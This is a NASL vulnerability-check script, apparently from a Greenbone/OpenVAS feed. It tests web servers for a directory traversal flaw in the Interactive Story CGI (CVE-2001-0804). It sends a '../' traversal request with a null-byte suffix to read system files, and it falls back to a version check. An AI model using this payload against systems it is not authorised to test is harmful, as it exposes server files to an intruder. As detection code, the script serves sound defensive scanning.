if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.10817" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)" );
	script_bugtraq_id( 3028 );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_cve_id( "CVE-2001-0804" );
	script_name( "Interactive Story Directory Traversal Vulnerability" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2001 Alert4Web.com" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "os_detection.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "solution", value: "Upgrade story.pl to the latest version (1.4 or later)." );
	script_tag( name: "summary", value: "It is possible to read arbitrary files on
  the remote server." );
	script_tag( name: "impact", value: "An attacker may use this flaw to read arbitrary files on
  this server." );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "VendorFix" );
	exit( 0 );
}
require("host_details.inc.sc");
require("os_func.inc.sc");
require("misc_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
port = http_get_port( default: 80 );
files = traversal_files( "linux" );
for dir in nasl_make_list_unique( "/", "/story", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	for file in keys( files ) {
		url = dir + "/story.pl?next=../../../../../" + files[file] + "%00";
		req = http_get( item: url, port: port );
		buf = http_keepalive_send_recv( port: port, data: req );
		if(egrep( pattern: "^HTTP/.* 404 .*", string: buf )){
			break;
		}
		if(egrep( pattern: file, string: buf )){
			report = http_report_vuln_url( port: port, url: url );
			security_message( port: port, data: report );
			exit( 0 );
		}
	}
	if(egrep( pattern: "^HTTP/.* 404 .*", string: buf )){
		continue;
	}
	url = dir + "/story.pl?next=about";
	req = http_get( item: url, port: port );
	buf = http_keepalive_send_recv( port: port, data: req );
	if(egrep( pattern: "This is version 1\\.[0-3] of the story program", string: buf )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

